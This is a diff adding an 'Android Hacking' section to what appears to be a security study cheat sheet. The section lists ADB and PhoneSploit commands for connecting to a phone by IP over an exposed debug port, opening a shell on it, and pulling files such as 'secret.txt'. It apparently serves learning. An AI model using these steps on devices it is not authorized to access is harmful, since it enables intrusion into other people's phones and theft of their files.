@@ -57,6 +57,65 @@ run
 ```
 </details>
 
+# Android Hacking
+<details>
+  <summary>ADB</summary>
+### ADB
+* To Install ADB
+```console
+apt-get update
+sudo apt-get install adb -y
+adb devices -l
+```
+* Connection Establish Steps
+
+```console
+adb connect 192.168.0.4:5555
+adb devices -l
+adb shell  
+```
+* To navigate
+```console
+pwd
+ls
+cd Download
+ls
+cd sdcard
+```
+* Download a File from Android using ADB tool
+```console
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+```
+</details>
+<details>
+  <summary>PhoneSploit</summary>
+  
+### PhoneSploit tool 
+* To install Phonesploit 
+```console
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+OR
+python3 -m pip install colorama
+```
+* To run Phonesploit
+```console
+python3 phonesploit.py
+```
+* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
+* Type 4, to Access Shell on phone
+* Download File using PhoneSploit
+```console
+9. Pull Folders from Phone to PC
+```
+* Enter the Full Path of file to Download
+```console
+sdcard/Download/secret.txt
+```  
+</details>
+
 # Resource
 <details>
   <summary>Course</summary>
